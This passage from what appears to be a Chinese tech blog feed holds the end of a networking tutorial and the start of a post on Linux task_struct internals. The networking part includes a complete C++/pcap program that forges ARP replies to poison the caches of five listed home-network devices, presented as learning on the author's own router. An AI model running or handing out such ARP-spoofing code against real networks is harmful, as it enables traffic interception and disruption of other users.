src="https://s2.loli.net/2023/08/22/FQ9uCrmhBpSa3vK.jpg" alt="net.jpg"></p><h3 id="ARP中间人攻击"><a href="#ARP中间人攻击" class="headerlink" title="ARP中间人攻击"></a>ARP中间人攻击</h3><p>​通过对上面的代码一些简单的修改，就能实现对网段内的所有设备进行依次询问（本网段从192.168.31.1到192.168.31.255的轮询），理论上就可以得到它们的IP及对应的MAC地址的响应包。当然由于这是我自家的路由器，也可以直接在浏览器输入192.168.31.1网关IP登录后台进行查看。将得到的结果记录下来，再构造一个 ARP reply包，就可以定向对某台设备进行ARP中间人攻击，代码如下，和上面的 ARP request代码很类似。具体代码如下，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push) <span class="comment">// 保持对齐方式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)   <span class="comment">// 设定1位对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者ip及mac地址</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *srcip = <span class="string">&quot;192.168.31.50&quot;</span>;</span><br><span class="line">u_char SRC_MAC[<span class="number">6</span>] = &#123;<span class="number">0xC8</span>, <span class="number">0x58</span>, <span class="number">0xC0</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0xC9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击目标</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTACK_NUM 5</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *victimip[ATTACK_NUM] = &#123;<span class="string">&quot;192.168.31.145&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.168&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.233&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.220&quot;</span>,</span><br><span class="line"><span class="string">&quot;192.168.31.188&quot;</span>&#125;;</span><br><span class="line">u_char VICTIM_MAC[ATTACK_NUM][<span class="number">6</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0x96</span>, <span class="number">0x90</span>, <span class="number">0x29</span>, <span class="number">0xBB</span>, <span class="number">0xAF</span>, <span class="number">0x1C</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x40</span>, <span class="number">0xB6</span>, <span class="number">0xE7</span>, <span class="number">0xEF</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE0</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0xBC</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x98</span>, <span class="number">0x2F</span>, <span class="number">0x3C</span>, <span class="number">0xB2</span>, <span class="number">0x5B</span>, <span class="number">0xF1</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x9E</span>, <span class="number">0x78</span>, <span class="number">0xB7</span>, <span class="number">0x94</span>, <span class="number">0x6B</span>, <span class="number">0x29</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">string polluteip = <span class="string">&quot;192.168.31.&quot;</span>;</span><br><span class="line">u_char FAKE_MAC[<span class="number">6</span>] = &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_eth_header</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> type;</span><br><span class="line">&#125; ETH_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_header</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> hardware_type;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> protocol_type;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hardware_len;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> protocol_len;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> option;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> src_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> src_ip;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> dst_mac[<span class="number">6</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> dst_ip;</span><br><span class="line">&#125; ARP_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_arp_packet</span></span><br><span class="line">&#123;</span><br><span class="line">ETH_HEADER eth_header;</span><br><span class="line">ARP_HEADER arp_header;</span><br><span class="line">&#125; ARP_PACKET;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitARPHeader</span><span class="params">(u_char *tmpBuf, <span class="type">int</span> ip_num, <span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ARP_HEADER arp_header;</span><br><span class="line"><span class="type">int</span> arpsize = <span class="built_in">sizeof</span>(ARP_HEADER);</span><br><span class="line"></span><br><span class="line">arp_header.hardware_type = <span class="built_in">htons</span>(<span class="number">0x0001</span>);</span><br><span class="line">arp_header.protocol_type = <span class="built_in">htons</span>(<span class="number">0x0800</span>);</span><br><span class="line">arp_header.hardware_len = <span class="number">6</span>;</span><br><span class="line">arp_header.protocol_len = <span class="number">4</span>;</span><br><span class="line">arp_header.option = <span class="built_in">htons</span>(<span class="number">0x0002</span>);</span><br><span class="line"></span><br><span class="line">string ret = polluteip + <span class="built_in">to_string</span>(ip_num);</span><br><span class="line">arp_header.src_ip = <span class="built_in">inet_addr</span>(ret.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">arp_header.src_mac[i] = FAKE_MAC[i];</span><br><span class="line">arp_header.dst_ip = <span class="built_in">inet_addr</span>(victimip[num]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">arp_header.dst_mac[i] = VICTIM_MAC[num][i];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">0</span>, &amp;arp_header.hardware_type, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">2</span>, &amp;arp_header.protocol_type, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">4</span>, &amp;arp_header.hardware_len, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">5</span>, &amp;arp_header.protocol_len, <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">6</span>, &amp;arp_header.option, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">8</span>, &amp;arp_header.src_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">14</span>, &amp;arp_header.src_ip, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">18</span>, &amp;arp_header.dst_mac, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(tmpBuf + <span class="number">24</span>, &amp;arp_header.dst_ip, <span class="number">4</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">pcap_t</span> *fp;</span><br><span class="line"><span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">u_char packet[<span class="number">42</span>];</span><br><span class="line"><span class="type">pcap_if_t</span> *alldevs;</span><br><span class="line"><span class="type">pcap_if_t</span> *d;</span><br><span class="line"><span class="type">int</span> inum;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检测网卡 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_findalldevs</span>(&amp;alldevs, errbuf) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Error in pcap_findalldevs: %s\n&quot;</span>, errbuf);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 打印网卡 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs; d; d = d-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d. %s&quot;</span>, ++i, d-&gt;name);</span><br><span class="line"><span class="keyword">if</span> (d-&gt;description)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; (%s)\n&quot;</span>, d-&gt;description);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; (No description available)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNo interfaces found! Make sure WinPcap is installed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the interface number (1-%d):&quot;</span>, i);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;inum);</span><br><span class="line"><span class="keyword">if</span> (inum &lt; <span class="number">1</span> || inum &gt; i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nInterface number out of range.\n&quot;</span>);</span><br><span class="line"><span class="comment">/* 释放 */</span></span><br><span class="line"><span class="built_in">pcap_freealldevs</span>(alldevs);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 选择 */</span></span><br><span class="line"><span class="keyword">for</span> (d = alldevs, i = <span class="number">0</span>; i &lt; inum - <span class="number">1</span>; d = d-&gt;next, i++)</span><br><span class="line">;</span><br><span class="line"><span class="comment">/* 打开输出设备 */</span></span><br><span class="line"><span class="keyword">if</span> ((fp = <span class="built_in">pcap_open_live</span>(d-&gt;name, <span class="comment">// name of the device</span></span><br><span class="line"> <span class="number">65536</span>,  <span class="comment">// portion of the packet to capture.</span></span><br><span class="line"> <span class="comment">// 65536 grants that the whole packet will be captured on all the MACs.</span></span><br><span class="line"> <span class="number">1</span>,<span class="comment">// promiscuous mode (nonzero means promiscuous)</span></span><br><span class="line"> <span class="number">0</span>,<span class="comment">// read timeout</span></span><br><span class="line"> errbuf <span class="comment">// error buffer</span></span><br><span class="line"> )) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nUnable to open the adapter. %s is not supported by WinPcap\n&quot;</span>, d-&gt;name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open succeed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">packet[i] = SRC_MAC[i - <span class="number">6</span>];</span><br><span class="line">packet[<span class="number">12</span>] = <span class="number">0x08</span>;</span><br><span class="line">packet[<span class="number">13</span>] = <span class="number">0x06</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 打印ARP包</span></span><br><span class="line"><span class="comment">for (int i = 0; i &lt; 42; i++)</span></span><br><span class="line"><span class="comment">cout &lt;&lt; hex &lt;&lt; (int)packet[i] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">cout &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">10000</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt; <span class="number">254</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> num = <span class="number">0</span>; num &lt; ATTACK_NUM; ++num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">packet[i] = VICTIM_MAC[num][i];</span><br><span class="line"><span class="built_in">InitARPHeader</span>(packet + <span class="number">14</span>, <span class="number">1</span>, num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pcap_sendpacket</span>(fp, (<span class="type">const</span> u_char *)&amp;packet, <span class="built_in">sizeof</span>(packet)) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nError sending the packet: %s\n&quot;</span>, <span class="built_in">pcap_geterr</span>(fp));</span><br><span class="line"><span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send succeed %lld times!\n&quot;</span>, ++count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​最后，ARP是基于IPv4的协议。在IPv6中，地址解析将由NDP（邻居发现协议，Neighbor Discovery Protocol）实现，它使用一系列IPv6控制信息报文（ICMPv6）来实现相邻节点（同一链路上的节点）的交互管理，并在一个子网中保持网络层地址和数据链路层地址之间的映射。邻居发现协议中定义了5种类型的信息：路由器宣告、路由器请求、路由重定向、邻居请求和邻居宣告。与ARP相比，NDP可以实现路由器发现、前缀发现、参数发现、地址自动配置、地址解析（代替ARP和RARP）、下一跳确定、邻居不可达检测、重复地址检测、重定向等更多功能。</p><hr><h2 id="踩坑补充"><a href="#踩坑补充" class="headerlink" title="踩坑补充"></a>踩坑补充</h2><ol><li><p>在抓包分析的过程中，发现通过pcap_sendpacket函数打出的ARP包的Ethernet层的Source字段以及ARP层的Sender MAC address字段并不是我自己写进去的值，而是被改成了物理机的MAC地址，目前还不清楚具体原因。<img src="https://s2.loli.net/2023/08/22/eiY6BXj1WQ8fc9b.png" alt="image.png"></p></li><li><p>代码中请注意取消内存对齐优化（上面代码里的第8，9行），详细可参考这篇文章：<a href="https://blog.csdn.net/Tomsidi/article/details/85710667">【C语言踩坑】PCAP发送ARP包之 – 多出的字节</a></p></li><li><p>理论上ARP请求应该是广播的，但从我抓包的结果来看，还发现了一些单播请求报文，如下图所示，它们是从我的网关路由器向我的设备发送过来的。这个看起来有点不符合常理，既然是单播，那就表明它知道我的MAC地址，事实上在报文帧首也确实有我的MAC地址（只不过这个地址确实是在Ethernet层而非在ARP层），至于为什么，我目前也还没有获得到比较好的答案。<img src="https://s2.loli.net/2023/08/20/bV1ETDA7zn2P9mr.png" alt="image.png"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Computer Networks </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux进程线程源码浅析</title>
      <link href="/2023/07/05/05task_struct/"/>
      <url>/2023/07/05/05task_struct/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习 Linux 分析与应用的过程中，最常被大家所提到的也就是：进程和线程。进程管理是所有操作系统的心脏，毫无疑问，这确实是一个很有意思的问题，值得我们去掌握。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>操作系统中，是用<strong>进程控制块</strong>（<em>process control block，PCB</em>）数据结构来描述进程的。也就是说：一个进程，我们可以将其看作是拥有一系列资源的一个个块。而这些资源的统一封装结构体便是：task_struct。在32位机器上，一个task_struct结构体大概有1.7KB大小，他能完整地描述一个正在执行的程序。</p><blockquote><p>在操作系统运行过程中，task_struct这些内核结构都是始终存在于内存里的，即使是操作系统时时刻刻都可能有磁盘与内存的数据换入换出，但是为保持系统稳定性，内核结构理论上是不会换出到磁盘里的。</p></blockquote><p>同样的，在Linux中一个线程也是用一个task_struct来表示，进程和线程的结构体类型没有任何区别，仅仅是其中的某些字段不一样而已，所有运行在系统中的进程&#x2F;线程都以 task_struct 的形式，并利用链表等多种数据结构组织于内核中。具体来说，在线程和进程创建时，clone() 系统调用通过传递的参数CLONE_THREAD flags不同，而选择使用不同的方式共享父进程&#x2F;父线程的资源，从而造成是新建了一个进程还是新建了一个线程的区别。</p><p>如果上述这段描述让你感到困惑，没关系，我们在后面会一步一步详细讲解。目前来说你可以简单地认为一个task_struct就对应一个线程，接下来让我们首先来看看 task_struct 结构体的一些主要字段。</p><h2 id="task-struct-主要字段解析"><a href="#task-struct-主要字段解析" class="headerlink" title="task_struct 主要字段解析"></a>task_struct 主要字段解析</h2><p>由于Linux每一个版本的源码并不完全相同，相关结构体和代码在迭代的过程中也逐渐变得复杂，因此我们这里是选取了最经典的一些字段作为分析和学习。</p><h4 id="1-进程唯一标识"><a href="#1-进程唯一标识" class="headerlink" title="1) 进程唯一标识"></a><strong>1) 进程唯一标识</strong></h4><p>进程标识有 pid 和 tgid 两个字段。在Linux系统中，例如下图中的main创建了三个子线程，我们之前提到每一个线程都是由一个task_struct所描述，因此下面这段程序实际上在内核中创建了4个task_struct结构体，分别是一个main主线程（我们记作t0）以及三个子线程（我们分别记作t1，t2，t3）。</p><p><strong>线程的实际线程号其实是 pid ，因此 pid 与线程是一一对应的关系</strong>，而一个线程组中所有的子线程和其主线程有相同的 tgid，而这个 tgid 也就是主线程（领头线程）的 pid。打个比方，在前面的例子里，可能t0，t1，t2，t3的tgid都是1000，而他们的pid分别是1000，1001，1002，1003。换句话说，tgid是从<strong>进程</strong>的视角来描述的，因为这四个线程统一存在于一个进程中，进程号便是1000；而pid则是从单个<strong>线程</strong>的角度来描述的，每一个pid也就对应内核中的一个具体的task_struct结构体，这也是调度的基本单位。</p><p><img src="https://s2.loli.net/2023/08/17/sgko9z2V5hdQqct.png" alt="image.png"></p><p>值得注意的是，我们通常所熟悉的 getpid() 系统调用返回的是其实是当前进程的 tgid 而不是pid值！也就是返回的其实是它的主线程的 pid。如果你需要获取该线程真正自己的 tgid，那么请使用 gettid() 方法！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> pid;<span class="comment">//进程的唯一标识</span></span><br><span class="line"><span class="type">pid_t</span> tgid;<span class="comment">// 线程组的主线程的pid成员的值</span></span><br></pre></td></tr></table></figure><h4 id="2）进程间的亲属关系"><a href="#2）进程间的亲属关系" class="headerlink" title="2）进程间的亲属关系"></a><strong>2）进程间的亲属关系</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">real_parent</span>;</span> <span class="comment">/* real parent process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">parent</span>;</span> <span class="comment">/* recipient of SIGCHLD, wait4() reports */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span>    <span class="comment">/* list of my children */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sibling</span>;</span>    <span class="comment">/* linkage in my parent&#x27;s children list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span>    <span class="comment">/* threadgroup leader */</span></span><br></pre></td></tr></table></figure><p>在Linux系统中，所有进程之间都有着直接或间接地联系，每个进程都有其父进程（除了idle 0号进程），也可能有零个或多个子进程。拥有同一父进程的所有进程具有兄弟关系。</p><ul><li><p>real_parent 指向其父进程，如果创建它的父进程不再存在，则指向PID为1的init进程。</p></li><li><p>parent 指向其父进程，当它终止时，必须向它的父进程发送信号。它的值通常与 real_parent相同。</p></li><li><p>children表示链表的头部，链表中的所有元素都是它的子进程（进程的子进程链表）。</p></li><li><p>sibling表示进程的兄弟链表的节点。</p></li><li><p>group_leader指向其所在进程组的主进程。</p></li></ul><blockquote><p>Linux下有3个特殊的进程，idle进程(PID &#x3D; 0), init进程(PID &#x3D; 1)和kthreadd(PID &#x3D; 2)。</p><ol><li>idle进程其pid&#x3D;0，它是系统BIOS自检，导入MBR载入操作系统内核之后创建的第一个进程，也是唯一一个没有通过fork或者kernel_thread产生的进程。</li><li>init进程由idle通过kernel_thread创建，在内核空间完成初始化后, 加载init程序, 最终存在于用户空间当守护进程，并作为所有用户进程的父进程。</li><li>kthreadd进程由idle通过kernel_thread创建，并始终运行在内核空间, 负责所有内核线程的调度和管理。</li></ol></blockquote><p><img src="https://s2.loli.net/2023/08/17/cCZumioGW864ALj.png" alt="image.png"></p><h4 id="3）进程的状态"><a href="#3）进程的状态" class="headerlink" title="**3）进程的状态 **"></a>**3）进程的状态 **</h4><p>状态state通过设置比特位的方式来赋值，来表示进程的状态，它们在进程调度中有着很关键的作用，state的可能取值为以下一些宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">long</span> state；</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_RUNNING        0<span class="comment">//进程要么正在执行，要么准备执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_INTERRUPTIBLE  1 <span class="comment">//可中断的睡眠，可以通过一个信号唤醒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_UNINTERRUPTIBLE    2 <span class="comment">//不可中断睡眠，不可以通过信号进行唤醒</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_STOPPED      4 <span class="comment">//进程停止执行</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __TASK_TRACED       8 <span class="comment">//进程被追踪</span></span></span><br><span class="line"><span class="comment">/* in tsk-&gt;exit_state */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXIT_ZOMBIE     16 <span class="comment">//僵尸状态的进程，表示进程被终止，但是父进程还没有获取它的终止信息，比如进程有没有执行完等信息。                     </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXIT_DEAD       32 <span class="comment">//进程的最终状态，进程死亡</span></span></span><br><span class="line"><span class="comment">/* in tsk-&gt;state again */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_DEAD       64 <span class="comment">//死亡</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_WAKEKILL       128 <span class="comment">//唤醒并杀死的进程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_WAKING     256 <span class="comment">//唤醒进程</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/17/4IzuoQxqb3MpTGw.png" alt="image.png"></p><h4 id="4）进程内核栈"><a href="#4）进程内核栈" class="headerlink" title="4）进程内核栈"></a><strong>4）进程内核栈</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="built_in">stack</span>;</span><br></pre></td></tr></table></figure><p>进程在内核态运行时需要自己的堆栈信息，因此linux内核为每个进程都提供了一个内核栈kernel 